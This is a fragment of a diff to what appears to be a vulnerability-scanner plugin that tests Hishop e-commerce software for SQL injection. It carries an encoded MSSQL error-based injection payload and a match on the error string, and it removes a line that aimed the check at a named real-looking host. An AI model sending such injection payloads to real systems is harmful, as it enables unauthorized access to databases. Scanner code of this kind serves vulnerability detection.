@@ -17,6 +17,7 @@ convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bc
     if code!=0 and 'GAO JI@Microsoft SQL Server' in res: 
         security_hole(target)
 
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('hishop', 'http://spt.0351tao.cn/')[1])
